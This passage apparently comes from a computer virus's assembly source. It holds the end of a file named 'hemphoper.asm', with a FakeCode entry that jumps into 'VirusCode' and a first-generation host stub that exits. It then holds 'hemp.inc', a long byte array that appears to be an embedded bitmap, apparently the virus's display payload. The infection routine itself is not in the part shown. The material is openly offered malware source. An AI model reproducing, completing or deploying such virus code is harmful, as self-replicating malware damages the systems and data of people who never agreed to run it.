.code                                  

FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess

end FakeCode


------------------------------< hemphoper.asm >--------------------------------------

------------------------------< hemp.inc >--------------------------------------
hemp_  DB 042H,04DH,0CAH,0DBH,000H,000H,000H,000H,000H,000H,036H,004H,000H,000H
DB 028H,000H,000H,000H,0FAH,000H,000H,000H,0DBH,000H,000H,000H,001H,000H,008H
DB 000H,000H,000H,000H,000H,094H,0D7H,000H,000H,0C4H,00EH,000H,000H,0C4H,00EH
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,015H,017H,00AH,000H,01AH
DB 044H,013H,000H,016H,037H,012H,000H,028H,029H,028H,000H,016H,049H,01BH,000H
DB 016H,054H,01FH,000H,01BH,079H,02AH,000H,01AH,06EH,027H,000H,018H,061H,023H
DB 000H,019H,03EH,01FH,000H,01BH,08CH,02FH,000H,025H,04AH,02CH,000H,002H,064H
DB 019H,000H,005H,078H,025H,000H,00AH,067H,025H,000H,010H,07DH,032H,000H,00DH
DB 06DH,02DH,000H,015H,0A5H,047H,000H,00DH,075H,035H,000H,00CH,081H,03DH,000H
DB 00CH,08EH,047H,000H,006H,0B3H,074H,000H,000H,099H,066H,000H,003H,0B9H,091H
DB 000H,003H,0C8H,0ABH,000H,004H,0DAH,0C6H,000H,000H,0FFH,0FFH,000H,0FFH,0FFH
DB 0FFH,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,039H,000H,051H,000H,09FH,000H
DB 074H,084H,07FH,000H,000H,000H,058H,000H,056H,000H,026H,000H,0F7H,0BFH,012H
DB 000H,000H,000H,078H,000H,040H,000H,0ECH,000H,0F9H,0BFH,0B8H,000H,0F7H,0BFH
DB 094H,000H,000H,000H,098H,000H,056H,000H,06DH,000H,0F7H,0BFH,09FH,000H,074H
DB 084H,000H,000H,000H,000H,074H,000H,09FH,045H,000H,000H,000H,000H,046H,000H
DB 000H,000H,0D2H,000H,002H,000H,0AAH,000H,000H,000H,0DFH,000H,0F7H,0BFH,037H
DB 000H,067H,001H,000H,000H,09FH,045H,037H,000H,067H,001H,0D8H,000H,076H,03DH
DB 0FFH,000H,004H,000H,000H,000H,000H,000H,000H,000H,0FAH,019H,040H,000H,039H
DB 000H,051H,000H,000H,000H,000H,000H,084H,000H,000H,000H,076H,03DH,010H,000H
DB 000H,000H,012H,000H,000H,000H,0C4H,000H,064H,07AH,0FFH,000H,09FH,045H,0D8H
DB 000H,0BDH,03DH,0FFH,000H,0FFH,0FFH,09FH,000H,012H,000H,000H,000H,09FH,045H
DB 000H,000H,0FCH,0C2H,01AH,000H,000H,000H,003H,000H,0FAH,019H,040H,000H,09DH
DB 09EH,0D7H,000H,000H,000H,039H,000H,051H,000H,000H,000H,084H,000H,08CH,000H
DB 000H,000H,000H,000H,0FCH,0C2H,002H,000H,0DFH,016H,0F9H,000H,0BFH,017H,000H
DB 000H,039H,000H,051H,000H,000H,000H,084H,000H,0FCH,0C2H,002H,000H,0FCH,0C2H
DB 002H,000H,000H,000H,000H,000H,0D7H,017H,0D8H,000H,03AH,085H,0BDH,000H,0BFH
DB 017H,001H,000H,0D0H,085H,09FH,000H,039H,000H,051H,000H,0FCH,0C2H,002H,000H
DB 0A0H,0C2H,002H,000H,000H,000H,000H,000H,000H,000H,000H,000H,05AH,085H,0BDH
DB 000H,0BFH,017H,001H,000H,0D0H,085H,09FH,000H,039H,000H,051H,000H,0A0H,0C2H
DB 002H,000H,089H,0A2H,000H,000H,002H,000H,002H,000H,094H,04EH,000H,000H,000H
DB 000H,002H,000H,0DFH,016H,0C2H,000H,0E4H,085H,03EH,000H,062H,029H,03FH,000H
DB 0DFH,016H,062H,000H,04AH,020H,00AH,000H,002H,000H,000H,000H,000H,002H,039H
DB 000H,051H,000H,000H,000H,0D2H,001H,035H,000H,039H,000H,051H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,03FH,04AH,003H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,03FH,04AH,03FH,000H,000H,000H,001H,000H
DB 0E7H,016H,0BEH,000H,074H,003H,000H,000H,000H,000H,000H,000H,000H,000H,003H
DB 000H,011H,001H,000H,000H,039H,02CH,0D7H,000H,0E3H,010H,039H,000H,051H,000H
DB 039H,000H,051H,000H,002H,000H,0E4H,085H,0A0H,000H,000H,002H,012H,000H,000H
DB 000H,000H,000H,000H,000H,03FH,000H,0FCH,0C2H,002H,000H,000H,000H,03FH,000H
DB 000H,000H,008H,000H,07CH,00BH,000H,000H,002H,000H,000H,000H,001H,000H,000H
DB 000H,000H,002H,000H,000H,000H,000H,028H,000H,09FH,045H,090H,000H,000H,000H
DB 034H,000H,0DFH,016H,000H,000H,03FH,04AH,054H,000H,07EH,09EH,0B7H,000H,000H
DB 000H,001H,000H,002H,000H,000H,000H,000H,002H,000H,000H,000H,000H,000H,000H
DB 028H,086H,09FH,000H,0A0H,0C2H,064H,000H,068H,000H,084H,000H,002H,002H,000H
DB 000H,039H,000H,051H,000H,0D0H,001H,035H,000H,039H,000H,051H,000H,000H,000H
DB 08CH,000H,002H,000H,034H,000H,064H,01EH,04EH,000H,08DH,0A9H,001H,000H,034H
DB 01EH,064H,000H,05CH,086H,05CH,000H,03CH,0AAH,000H,000H,0A0H,0C2H,000H,000H
DB 03FH,04AH,04AH,000H,07EH,049H,0CFH,000H,001H,000H,012H,000H,000H,000H,00CH
DB 000H,068H,000H,064H,000H,0C0H,0BFH,076H,000H,076H,007H,000H,000H,076H,007H
DB 002H,000H,000H,000H,092H,000H,03AH,064H,076H,000H,026H,002H,066H,000H,04DH
DB 04FH,0B7H,000H,000H,000H,044H,000H,002H,000H,0B7H,000H,0A2H,086H,022H,000H
DB 000H,000H,025H,000H,000H,000H,000H,000H,066H,0F6H,0AEH,000H,0EAH,016H,0B0H
DB 000H,066H,0F6H,000H,000H,076H,007H,000H,000H,0C0H,086H,03BH,000H,076H,007H
DB 076H,000H,044H,001H,0B7H,000H,056H,007H,000H,000H,000H,000H,0B7H,000H,0DCH
DB 087H,0BFH,000H,07FH,005H,057H,000H,000H,000H,0B7H,000H,086H,0FCH,07FH,000H
DB 0E0H,086H,070H,000H,0BFH,017H,06EH,000H,076H,007H,0DFH,000H,01CH,0A7H,0F4H
DB 000H,0CFH,066H,0BFH,000H,0A2H,011H,01FH,000H,0BFH,017H,07FH,000H,0FFH,04BH
DB 000H,000H,07CH,014H,004H,000H,01EH,00DH,0BFH,000H,010H,087H,00FH,000H,01CH
DB 0A7H,002H,000H,023H,00DH,070H,000H,078H,018H,000H,000H,080H,018H,000H,000H
DB 01CH,087H,0DFH,000H,057H,001H,0E2H,000H,080H,018H,001H,000H,06FH,001H,05EH
DB 000H,0E9H,04AH,057H,000H,064H,013H,06FH,000H,078H,018H,000H,000H,080H,018H
DB 000H,000H,05EH,087H,056H,000H,046H,087H,056H,000H,000H,000H,000H,000H,001H
DB 000H,0D8H,000H,001H,000H,000H,000H,080H,018H,000H,000H,05FH,003H,06FH,000H
DB 0FFH,000H,0EEH,000H,0F7H,0BFH,077H,000H,000H,000H,0D4H,000H,0F7H,0BFH,09DH
DB 000H,000H,000H,09CH,000H,056H,000H,024H,000H,00DH,000H,0C4H,000H,000H,000H
DB 01CH,000H,059H,000H,091H,000H,0F7H,0BFH,000H,000H,08AH,009H,05AH,000H,05EH
DB 094H,000H,000H,000H,000H,092H,000H,03AH,064H,08AH,000H,026H,002H,0DEH,000H
DB 04DH,04FH,07FH,000H,001H,000H,022H,000H,000H,000H,0B7H,000H,0A8H,087H,048H
DB 000H,047H,004H,08AH,000H,000H,000H,01EH,000H,0CAH,08BH,036H,000H,05EH,094H
DB 05EH,000H,0B7H,005H,0E4H,000H,099H,013H,057H,000H,006H,017H,0CEH,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH
DB 01AH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01AH,01AH,01AH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH
DB 01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH
DB 01AH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01AH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01AH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01AH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01AH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH
DB 01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH,01AH,01CH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH
DB 01CH,01AH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH,01AH,01CH,01AH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH
DB 01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01AH,01AH,01AH,01AH,01CH,01AH
DB 01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01AH,01CH,01AH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01AH
DB 01AH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01AH
DB 01AH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01AH
DB 01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH
DB 01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01AH,01CH,01CH
DB 01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH
DB 01CH,01AH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01AH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH
DB 01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01CH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01AH
DB 01AH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01AH,01AH,01AH,01CH
DB 01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH
DB 01AH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01AH,01AH,01CH,01CH,01CH
DB 01AH,01AH,01AH,01CH,01CH,01AH,01AH,01AH,01CH,01AH,01AH,01CH,01CH,01AH,01CH
DB 01AH,01CH,01CH,01AH,01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01AH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01CH,01AH,01AH,01CH,01CH,01AH,01AH
DB 01AH,01CH,01CH,01AH,01AH,01AH,01CH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01AH,01CH
DB 01CH,01AH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01AH,01CH,01CH,01AH,01AH,01AH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01AH,01CH,01AH,01CH,01AH,01AH,01CH,01AH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01AH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01AH,01AH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
